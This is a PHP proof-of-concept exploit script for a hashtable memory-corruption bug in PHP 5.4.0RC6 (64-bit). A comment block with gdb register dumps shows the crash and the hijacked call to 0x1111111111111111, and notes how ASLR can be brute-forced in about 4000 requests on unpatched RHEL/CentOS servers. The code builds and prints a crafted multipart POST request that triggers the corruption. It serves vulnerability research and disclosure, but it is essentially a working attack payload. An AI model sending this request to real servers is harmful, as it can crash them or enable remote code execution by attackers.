<?php
/* This script generates a POST header that makes PHP 5.4.0RC6 *64 bit* try to execute code at 0x1111111111111111
(C) Copyright 2012 Stefan Esser
PHP 5.3.9 requires you to know the address of a writable address filled with NULL.
32bit requires you to create a fake 32bit Hashtable instead of a 64bit one
Because this vulnerability also allows leaking memory addresses ASLR can be "semi"-defeated. This means around 4000
tries = 4000 requests = 4000 crashes are enough to bruteforce code addresses to execute arbitrary code despite ASLR/NX
better exploit might be possible after deeper research + heap massage
This specific attack only works if there is no Suhosin-Patch -> RHEL, CentOS
(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007fd959ca5f9d in _zend_hash_index_update_or_next_insert (ht=0x7fd96480d508, h=0, pData=0x7fff75c47bd0, nDataSize=8, pDest=0x7fff75c47bc8, flag=1,
__zend_filename=0x7fd95a061b68 "/home/user/Downloads/php-5.4.0RC6/Zend/zend_hash.h", __zend_lineno=350)
at /home/user/Downloads/php-5.4.0RC6/Zend/zend_hash.c:398
398					ht->pDestructor(p->pData);
(gdb) i r
rax            0x7fd9583352a0	140571464389280
rbx            0x0	0
rcx            0x8	8
rdx            0x111111111111111	76861433640456465
rsi            0x7fd95a077b08	140571495070472
rdi            0x7fd9583352a0	140571464389280
rbp            0x7fff75c47ae0	0x7fff75c47ae0
rsp            0x7fff75c47a80	0x7fff75c47a80
r8             0x7fff75c47bc8	140735169199048
r9             0x1	1
r10            0x6238396661373430	7077469926293189680
r11            0x7fd962f4c8e0	140571644840160
r12            0x7fd966b91da8	140571708038568
r13            0x0	0
r14            0xffffffff00000001	-4294967295
r15            0x7fd964b10538	140571673953592
rip            0x7fd959ca5f9d	0x7fd959ca5f9d <_zend_hash_index_update_or_next_insert+477> eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/5i $rip
=> 0x7fd959ca5f9d <_zend_hash_index_update_or_next_insert+477>:	callq  *%rdx
0x7fd959ca5f9f <_zend_hash_index_update_or_next_insert+479>:	cmpl   $0x8,-0x3c(%rbp)
0x7fd959ca5fa3 <_zend_hash_index_update_or_next_insert+483>:	jne    0x7fd959ca6031 <_zend_hash_index_update_or_next_insert+625> 0x7fd959ca5fa9 <_zend_hash_index_update_or_next_insert+489>:	mov    -0x18(%rbp),%rax
0x7fd959ca5fad <_zend_hash_index_update_or_next_insert+493>:	mov    0x10(%rax),%rax
(gdb)
*/
$boundary = md5(microtime());
$varname = "xxx";
$payload = "";
$payload .= "--$boundary\n";
$payload .= 'Content-Disposition: form-data; name="'.$varname.'"'."\n\n";
$payload .= chr(16);
for ($i=1; $i<7*8; $i++) {
$payload .= chr(0);
}
for ($i=1; $i<8; $i++) {
$payload .= "\x11";
}
$payload .= chr(1);
for ($i=16+48+1; $i<128; $i++) {
$payload .= chr(0);
}
$payload .= "\n";
for ($i=0; $i<1000; $i++) {
$payload .= "--$boundary\n";
$payload .= 'Content-Disposition: form-data; name="aaa'.$i.'"'."\n\n";
$payload .= "aaa\n";
}
$payload .= "--$boundary\n";
$payload .= 'Content-Disposition: form-data; name="'.$varname.'[]"'."\n\n";
$payload .= "aaa\n";
$payload .= "--$boundary\n";
$payload .= 'Content-Disposition: form-data; name="'.$varname.'[0]"'."\n\n";
$payload .= "aaa\n";
$payload .= "--$boundary--\n";
echo "POST /index.php HTTP/1.0\n";
echo "Content-Type: multipart/form-data; boundary=$boundary\n";
echo "Content-Length: ",strlen($payload),"\n";
echo "\n";
echo "$payload";
?>